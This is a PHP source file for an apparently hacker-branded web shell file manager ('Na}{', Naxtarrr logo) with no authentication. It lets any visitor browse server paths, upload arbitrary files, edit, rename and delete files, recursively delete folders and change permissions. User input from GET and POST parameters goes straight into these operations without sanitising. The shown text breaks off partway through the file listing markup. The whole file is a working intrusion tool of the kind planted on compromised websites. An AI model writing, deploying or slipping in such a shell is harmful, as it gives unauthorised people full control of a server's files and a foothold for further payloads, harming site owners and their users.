<?php
session_start();
ob_start();

$path = (isset($_GET["path"])) ? $_GET["path"] : getcwd();
$file = (isset($_GET["file"])) ? $_GET["file"] : "";

$os = php_uname('s');
$separator = ($os === 'Windows') ? "\\" : "/";
$explode = explode($separator, $path);

function doFile($file, $content)
{
    if ($content == "") {
        $content = base64_encode("empty");
    } else {
        $content = base64_encode($content);
    }

    $op = fopen($file, "w");
    $write = fwrite($op, base64_decode($content));
    fclose($op);
    return ($write) ? true : false;
}

function removeFolder($folderPath)
{
    // Pastikan folder ada dan memang direktori
    if (!file_exists($folderPath) || !is_dir($folderPath)) {
        return false;
    }

    // Ambil semua isi direktori
    $items = scandir($folderPath);
    foreach ($items as $item) {
        if ($item === "." || $item === "..") {
            continue;
        }

        $itemPath = $folderPath . DIRECTORY_SEPARATOR . $item;

        // Jika direktori, panggil fungsi secara rekursif
        if (is_dir($itemPath)) {
            removeFolder($itemPath);
        } else {
            // Hapus file
            unlink($itemPath);
        }
    }

    // Hapus folder setelah isinya dihapus
    return rmdir($folderPath);
}

function chmodItem($filePath, $permissions)
{
    if (isset($_GET["file"])) {
        $item = "file";
        $name = $_GET["file"];
    } else if (isset($_GET["folder"])) {
        $item = "folder";
        $name = $_GET["folder"];
    } else {
        return false;
    }

    $chmod = chmod($filePath, octdec($permissions));

    if ($chmod) {
        $_SESSION["success"] = "Permissions changed successfully!";
        header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&" . $item . "=" . urlencode($name) . "&action=chmod$item");
        exit;
    } else {
        $_SESSION["error"] = "Failed to change permissions.";
        header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&" . $item . "=" . urlencode($name) . "&action=chmod$item");
        exit;
    }
}
?>
<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Na}{</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
</head>

<body class="bg-gray-300 dark:bg-gray-900 text-gray-800 dark:text-gray-200">
    <?php
    if (isset($_SESSION["success"])) {
    ?>
        <div id="toast-default" class="fixed top-0 right-0 z-10 flex items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-sm dark:text-gray-400 dark:bg-gray-800" role="alert">
            <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-green-500 bg-green-100 rounded-lg dark:bg-green-300 dark:text-green-200">
                <svg class="w-6 h-6 text-green-600 dark:text-green-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm13.707-1.293a1 1 0 0 0-1.414-1.414L11 12.586l-1.793-1.793a1 1 0 0 0-1.414 1.414l2.5 2.5a1 1 0 0 0 1.414 0l4-4Z" clip-rule="evenodd" />
                </svg>
            </div>
            <div class="ms-3 text-sm font-normal"><?= $_SESSION["success"]; ?></div>
            <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-default" aria-label="Close">
                <span class="sr-only">Close</span>
                <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                </svg>
            </button>
        </div>
    <?php
        unset($_SESSION["success"]);
    }

    if (isset($_SESSION["error"])) {
    ?>
        <div id="toast-default" class="fixed top-0 right-0 z-10 flex items-center w-full max-w-xs p-4 text-gray-500 bg-white rounded-lg shadow-sm dark:text-gray-400 dark:bg-gray-800" role="alert">
            <div class="inline-flex items-center justify-center shrink-0 w-8 h-8 text-red-500 bg-red-100 rounded-lg dark:bg-red-300 dark:text-red-200">
                <svg class="w-6 h-6 text-red-800 dark:text-red-700" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                    <path fill-rule="evenodd" d="M2 12C2 6.477 6.477 2 12 2s10 4.477 10 10-4.477 10-10 10S2 17.523 2 12Zm7.707-3.707a1 1 0 0 0-1.414 1.414L10.586 12l-2.293 2.293a1 1 0 1 0 1.414 1.414L12 13.414l2.293 2.293a1 1 0 0 0 1.414-1.414L13.414 12l2.293-2.293a1 1 0 0 0-1.414-1.414L12 10.586 9.707 8.293Z" clip-rule="evenodd" />
                </svg>
            </div>
            <div class="ms-3 text-sm font-normal"><?= $_SESSION["error"]; ?></div>
            <button type="button" class="ms-auto -mx-1.5 -my-1.5 bg-white text-gray-400 hover:text-gray-900 rounded-lg focus:ring-2 focus:ring-gray-300 p-1.5 hover:bg-gray-100 inline-flex items-center justify-center h-8 w-8 dark:text-gray-500 dark:hover:text-white dark:bg-gray-800 dark:hover:bg-gray-700" data-dismiss-target="#toast-default" aria-label="Close">
                <span class="sr-only">Close</span>
                <svg class="w-3 h-3" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 14 14">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
                </svg>
            </button>
        </div>
    <?php
    }
    ?>
    <div class="container mx-auto px-4">

        <div class="flex content-center items-center flex-col md:flex-row">
            <a href="?"><img src="https://naxtarrr.netlify.app/img/Naxtarrr.png" class="h-20 w-auto mt-2"></a>
            <form class="md:ms-auto max-w-lg mt-4" method="post" enctype="multipart/form-data">
                <input class="py-2.5 px-2 text-sm text-gray-900 border border-gray-300 rounded-lg cursor-pointer bg-gray-50 dark:text-gray-400 focus:outline-none dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400" type="file" name="nax">
                <button class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="submit">
                    Submit
                </button>
            </form>
        </div>

        <?php
        if (isset($_POST["submit"])) {
            $filename = basename($_FILES["nax"]["name"]);
            $tempname = $_FILES["nax"]["tmp_name"];
            $destination = $path . DIRECTORY_SEPARATOR . $filename;

            if (move_uploaded_file($tempname, $destination)) {
                $_SESSION["success"] = "File uploaded successfully!";
                header("Refresh:0; url=?path=" . urlencode($path));
                exit;
            } else {
                $_SESSION["error"] = "Upload failed!";
                header("Refresh:0; url=?path=" . urlencode($path));
                exit;
            }
        }
        ?>

        <div class="flex content-center mt-5">
            <div class="inline-block mx-auto bg-gray-50 dark:bg-gray-700 p-4 text-sm text-center text-gray-500 dark:text-gray-400 rounded-lg overflow-auto">

                <?php
                if (isset($_GET["file"]) && !isset($_GET["path"])) {
                    $path = dirname($_GET["file"]);
                }
                $path = str_replace("\\", "/", $path);

                $paths = explode("/", $path);
                echo 'Path: ';
                echo (!preg_match("/Windows/", $os)) ? "<a class='hover:text-gray-600 dark:hover:text-gray-500' id='dir' href='?path=/'>~</a>" : "";
                foreach ($paths as $id => $pat) {
                    echo "<a class='hover:text-gray-600 dark:hover:text-gray-500' href='?path=";
                    for ($i = 0; $i <= $id; $i++) {
                        echo $paths[$i];
                        if ($i != $id) {
                            echo "/";
                        }
                    }
                    echo "'>$pat</a>/";
                }
                ?>
            </div>
        </div>

        <?php
        if (isset($_GET["path"]) && @$_GET["action"] === "newfile") {
        ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <div class="mb-4">
                        <label for="file_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New File Name:</label>
                        <input type="text" id="file_name" name="file_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    </div>
                    <div>
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">File Content:</label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfile">
                            Create file
                        </button>
                    </div>
                </div>
            </form>
            <?php
            if (isset($_POST["newfile"])) {
                $fileName = trim($_POST["file_name"]);
                $filePath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $fileName;

                if ($fileName !== "" && !file_exists($filePath)) {
                    if (doFile($filePath, "")) {
                        $_SESSION["success"] = "File created successfully!";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to create file.";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    }
                } else {
                    $_SESSION["error"] = "File already exists or invalid name.";
                    header("Refresh:0; url=?path=" . urlencode($path));
                    exit;
                }
            }
        }

        if (isset($_GET["path"]) && @$_GET["action"] === "newfolder") {
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="folder_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">New Folder Name:</label>
                    <input type="text" id="folder_name" name="folder_name" class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500" required>
                    <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="newfolder">
                        Create folder
                    </button>
                </div>
            </form>
            <?php
            if (isset($_POST["newfolder"])) {
                $folderName = trim($_POST["folder_name"]);
                $folderPath = rtrim($path, "/\\") . DIRECTORY_SEPARATOR . $folderName;

                if ($folderName !== "" && !file_exists($folderPath)) {
                    if (mkdir($folderPath, 0777, true)) {
                        $_SESSION["success"] = "Folder created successfully!";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    } else {
                        $_SESSION["error"] = "Failed to create folder.";
                        header("Refresh:0; url=?path=" . urlencode($path));
                        exit;
                    }
                } else {
                    $_SESSION["error"] = "Folder already exists or invalid name.";
                    header("Refresh:0; url=?path=" . urlencode($path));
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "view" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . DIRECTORY_SEPARATOR . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <div class='mt-4 text-gray-700 dark:text-gray-300'>
                    <h2 class='text-lg font-semibold'>File Content: <code><?= htmlspecialchars($_GET["file"]); ?></code></h2>
                    <textarea rows="12" class='block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white focus:outline-none' readonly><?= htmlspecialchars(file_get_contents($filePath)); ?></textarea>
                </div>
                <div class="flex gap-x-2 mt-2">
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=edit">Edit</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=renamefile">Rename</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=chmodfile">Chmod</a>
                    <a class="hover:text-gray-600 dark:hover:text-gray-500" href="?path=<?= $_GET['path']; ?>&file=<?= $_GET['file']; ?>&action=deletefile">Delete</a>
                </div>
            <?php
            } else {
            ?>
                <div class='mt-4 text-red-600'>File does not exist or is not readable.</div>
            <?php
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "edit" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
                $content = htmlspecialchars(file_get_contents($filePath));
            ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <label for="file_content" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">File Content: <code><?= htmlspecialchars($_GET["file"]); ?></code></label>
                        <textarea id="file_content" name="file_content" rows="12" class="block p-2.5 w-full text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"><?= $content; ?></textarea>
                        <button class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer" type="submit" name="edit">
                            Submit
                        </button>
                    </div>
                </form>
            <?php
            } else {
                echo "<div class='mt-4 text-red-600'>File does not exist or is not readable.</div>";
            }

            if (isset($_POST["edit"])) {
                $content = $_POST["file_content"];
                if (doFile($filePath, $content)) {
                    $_SESSION["success"] = "File updated successfully!";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=edit");
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to update file.";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=edit");
                    exit;
                }
            }
        }

        // --- Rename Logic (file or folder) ---
        function handleRename($type, $currentNameKey)
        {
            $isFile = ($type === 'file');
            $nameKey = $isFile ? 'file' : 'folder';

            if (!isset($_GET["path"], $_GET[$nameKey])) {
                echo "<div class='mt-4 text-red-600'>Invalid parameters.</div>";
                return;
            }

            $currentName = $_GET[$nameKey];
            $path = rtrim($_GET["path"], "/\\");
            $fullPath = $path . DIRECTORY_SEPARATOR . $currentName;

            $isValid = $isFile ? (file_exists($fullPath) && is_file($fullPath)) : (is_dir($fullPath) && is_writable($fullPath));
            if (!$isValid) {
                echo "<div class='mt-4 text-red-600'>" . ucfirst($type) . " does not exist or is not readable.</div>";
                return;
            }

            // Handle POST Rename
            if (isset($_POST["rename"])) {
                $newName = trim($_POST["new_name"]);
                $newPath = $path . DIRECTORY_SEPARATOR . $newName;

                if ($newName !== "" && rename($fullPath, $newPath)) {
                    $_SESSION["success"] = ucfirst($type) . " renamed successfully!";
                    header("Location: ?path=" . urlencode($path) . "&" . $nameKey . "=" . urlencode($newName) . "&action=rename" . $type);
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to rename " . $type . ".";
                    header("Location: ?path=" . urlencode($path) . "&" . $nameKey . "=" . urlencode($currentName) . "&action=rename" . $type);
                    exit;
                }
            }

            // Show form
            ?>
            <form method="post" action="">
                <div class='mt-4'>
                    <label for="new_name" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                        New <?= ucfirst($type) ?> Name:
                    </label>
                    <input type="text" id="new_name" name="new_name" value="<?= htmlspecialchars($currentName); ?>"
                        class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                        required>
                    <button
                        class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer"
                        type="submit" name="rename">
                        Rename
                    </button>
                </div>
            </form>
            <?php
        }

        // --- Route Rename Requests ---
        if (isset($_GET["action"])) {
            if ($_GET["action"] === "renamefile") {
                handleRename("file", "file");
            } elseif ($_GET["action"] === "renamefolder") {
                handleRename("folder", "folder");
            }
        }


        if (isset($_GET["action"]) && $_GET["action"] === "deletefile" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) && is_file($filePath)) {
            ?>
                <div class='mt-4 text-red-600 mx-auto text-center'>
                    <p>Are you sure you want to delete the file <code><?= htmlspecialchars($_GET["file"]); ?></code>?</p>
                    <form method="post" action="">
                        <button class="mt-2 text-white bg-red-600 hover:bg-red-700 focus:ring-4 focus:outline-none focus:ring-red-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-red-600 dark:hover:bg-red-700 dark:focus:ring-red-800 cursor-pointer" type="submit" name="delete">
                            Delete
                        </button>
                    </form>
                </div>
            <?php
            } else {
                echo "<div class='mt-4 text-red-600'>File does not exist or is not readable.</div>";
            }

            if (isset($_POST["delete"])) {
                if (unlink($filePath)) {
                    $_SESSION["success"] = "File deleted successfully!";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]));
                    exit;
                } else {
                    $_SESSION["error"] = "Failed to delete file.";
                    header("Refresh:0; url=?path=" . urlencode($_GET["path"]) . "&file=" . urlencode($_GET["file"]) . "&action=deletefile");
                    exit;
                }
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "deletefolder" && isset($_GET["path"]) && isset($_GET["file"])) {
            $basePath = rtrim($_GET["path"], "/\\");
            $folderName = $_GET["file"];
            $folderPath = $basePath . "/" . $folderName;

            if (file_exists($folderPath) && is_dir($folderPath)) {
            ?>
                <!-- Tampilkan konfirmasi -->
                <div class='mt-4 text-red-600 mx-auto text-center'>
                    <p>Are you sure you want to delete the folder <code><?= htmlspecialchars($folderName); ?></code> and all its contents?</p>
                    <form method="post">
                        <button class="mt-2 bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded" type="submit" name="delete_folder">
                            Yes, Delete Folder
                        </button>
                    </form>
                </div>
                <?php

                // Hapus setelah konfirmasi
                if (isset($_POST["delete_folder"])) {
                    if (removeFolder($folderPath)) {
                        $_SESSION["success"] = "Folder and its contents deleted successfully.";
                    } else {
                        $_SESSION["error"] = "Failed to delete folder.";
                    }

                    // Redirect untuk menghindari submit ulang
                    header("Location: ?path=" . urlencode($basePath));
                    exit;
                }
            } else {
                echo "<div class='mt-4 text-red-600'>Folder does not exist.</div>";
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfile" && isset($_GET["file"])) {
            $filePath = rtrim($_GET["path"], "/\\") . "/" . $_GET["file"];
            if (file_exists($filePath) || is_writable($filePath)) {
                ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <label for="new_permission" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                            File: <?= htmlspecialchars($_GET["file"]); ?>
                        </label>
                        <input type="text" id="new_permission" name="new_permission" value="<?= substr(sprintf('%o', @fileperms($filePath)), -4); ?>"
                            class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                            required>
                        <button
                            class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer"
                            type="submit" name="chmodfile">
                            Chmod
                        </button>
                    </div>
                </form>
                <?php
                if (isset($_POST["chmodfile"])) {
                    $newPermission = $_POST["new_permission"];
                    chmodItem($filePath, $newPermission);
                }
            } else {
                echo "<div class='mt-4 text-red-600'>File does not exist or is not writable.</div>";
            }
        }

        if (isset($_GET["action"]) && $_GET["action"] === "chmodfolder" && isset($_GET["folder"])) {
            $folderPath = rtrim($_GET["path"], "/\\") . "/" . $_GET["folder"];
            if (is_dir($folderPath) || is_writable($folderPath)) {
                ?>
                <form method="post" action="">
                    <div class='mt-4'>
                        <label for="new_permission" class="block mb-2.5 text-sm font-medium text-gray-900 dark:text-white">
                            Fplder: <?= htmlspecialchars($_GET["folder"]); ?>
                        </label>
                        <input type="text" id="new_permission" name="new_permission" value="<?= substr(sprintf('%o', @fileperms($folderPath)), -4); ?>"
                            class="block w-full p-2.5 text-sm text-gray-900 bg-gray-50 rounded-lg border border-gray-300 focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
                            required>
                        <button
                            class="block mt-3 w-full max-w-sm mx-auto text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800 cursor-pointer"
                            type="submit" name="chmodfolder">
                            Chmod
                        </button>
                    </div>
                </form>
        <?php
                if (isset($_POST["chmodfolder"])) {
                    $newPermission = $_POST["new_permission"];
                    chmodItem($folderPath, $newPermission);
                }
            } else {
                echo "<div class='mt-4 text-red-600'>Folder does not exist or is not writable.</div>";
            }
        }
        ?>

        <!-- TABLE DISPLAY -->
        <div class="flex mt-4.5">
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 rounded-tl-lg br-8" href="?path=<?= $path; ?>&action=newfile">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                </svg>
                <span>FILE</span>
            </a>
            <a class="flex gap-x-1 item-center text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400 p-3 bl-8" href="?path=<?= $path; ?>&action=newfolder">
                <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                    <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14m-7 7V5" />
                </svg>
                <span>FOLDER</span>
            </a>
        </div>
        <div class="relative overflow-x-auto shadow-md rounded-br-lg rounded-bl-lg rounded-tr-lg">
            <table class="w-full text-sm text-left rtl:text-right text-gray-500 dark:text-gray-400">
                <thead class="text-xs text-gray-700 uppercase bg-gray-50 dark:bg-gray-700 dark:text-gray-400">
                    <tr>
                        <th class="px-6 py-3">Name</th>
                        <th class="px-6 py-3">Size</th>
                        <th class="px-6 py-3">Permission</th>
                        <th class="px-6 py-3">Action</th>
                    </tr>
                </thead>
                <?php if (is_readable($path)): ?>
                    <tbody>
                        <?php
                        $files = scandir($path);
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_file($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-1 " href="?path=<?= urlencode($path . DIRECTORY_SEPARATOR . $file); ?>">
                                        <svg class="w-6 h-6 text-gray-800 dark:text-yellow-400" xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M3 6a2 2 0 0 1 2-2h5.532a2 2 0 0 1 1.536.72l1.9 2.28H3V6Zm0 3v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9H3Z" clip-rule="evenodd" />
                                        </svg>
                                        <span><?= $file; ?></span>
                                    </a>
                                </td>
                                <td class='px-6 py-4'>---</td>
                                <td class='px-6 py-4 <?php if (is_writable($filePath)): ?> text-green-400 <?php endif; ?>'><?= $filePerms; ?></td>
                                <td class='px-6 py-4 flex gap-x-1'>
                                    <!-- Folder Rename Action -->
                                    <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=renamefolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.779 17.779 4.36 19.918 6.5 13.5m4.279 4.279 8.364-8.643a3.027 3.027 0 0 0-2.14-5.165 3.03 3.03 0 0 0-2.14.886L6.5 13.5m4.279 4.279L6.499 13.5m2.14 2.14 6.213-6.504M12.75 7.04 17 11.28" />
                                        </svg>
                                    </a>
                                    <!-- Folder Chmod Action -->
                                    <a href="?path=<?= $path ?>&folder=<?= urlencode($file); ?>&action=chmodfolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24">
                                            <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 8v8m0-8h8M8 8H6a2 2 0 1 1 2-2v2Zm0 8h8m-8 0H6a2 2 0 1 0 2 2v-2Zm8 0V8m0 8h2a2 2 0 1 1-2 2v-2Zm0-8h2a2 2 0 1 0-2-2v2Z" />
                                        </svg>
                                    </a>
                                    <!-- Folder Delete Action -->
                                    <a href="?path=<?= $path ?>&file=<?= urlencode($file); ?>&action=deletefolder" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M8.586 2.586A2 2 0 0 1 10 2h4a2 2 0 0 1 2 2v2h3a1 1 0 1 1 0 2v12a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8a1 1 0 0 1 0-2h3V4a2 2 0 0 1 .586-1.414ZM10 6h4V4h-4v2Zm1 4a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Zm4 0a1 1 0 1 0-2 0v8a1 1 0 1 0 2 0v-8Z" clip-rule="evenodd" />
                                        </svg>
                                    </a>
                                </td>
                            </tr>
                        <?php } ?>
                    </tbody>

                    <tbody>
                        <?php
                        foreach ($files as $file) {
                            if ($file === '.' || $file === '..' || is_dir($path . DIRECTORY_SEPARATOR . $file)) continue;

                            $filePath = $path . DIRECTORY_SEPARATOR . $file;
                            $fileSize = @filesize($filePath);
                            $filePerms = substr(sprintf('%o', @fileperms($filePath)), -4);
                        ?>
                            <tr class='bg-white border-b dark:bg-gray-800 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-600'>
                                <td class='px-6 py-4 font-medium text-gray-900 whitespace-nowrap dark:text-white'>
                                    <a class="flex items-center gap-x-1 " href="?path=<?= urlencode($path); ?>&file=<?= urlencode($file); ?>&action=view">
                                        <svg class="w-6 h-6 text-gray-800 dark:text-blue-300" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M9 2.221V7H4.221a2 2 0 0 1 .365-.5L8.5 2.586A2 2 0 0 1 9 2.22ZM11 2v5a2 2 0 0 1-2 2H4v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2h-7Z" clip-rule="evenodd" />
                                        </svg>
                                        <span><?= $file; ?></span>
                                    </a>
                                </td>
                                <td class='px-6 py-4'><?= $fileSize; ?> bytes</td>
                                <td class='px-6 py-4 <?php if (is_writable($filePath)): ?> text-green-400 <?php endif; ?>'><?= $filePerms; ?></td>
                                <td class='px-6 py-4 flex gap-x-1'>
                                    <!-- File Edit Action -->
                                    <a href="?path=<?= $path; ?>&file=<?= urlencode($file); ?>&action=edit" class='text-blue-600 hover:underline'>
                                        <svg class="w-6 h-6 text-gray-800 dark:text-white" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 24 24">
                                            <path fill-rule="evenodd" d="M11.32 6.176H5c-1.105 0-2 .949-2 2.118v10.588C3 20.052 3.895 21 5 21h11c1.105 0 2-.948 2-2.118v-7.75l-3.914 4.144A2.46 2.46 0 0 1 12.81 16l-2.681.568c-1.75.37-3.292-1.263-2.942-3.115l.536-2.839c.097-.512.335-.983.684-1.352l2.914-3.086Z" clip-rule="evenodd" />
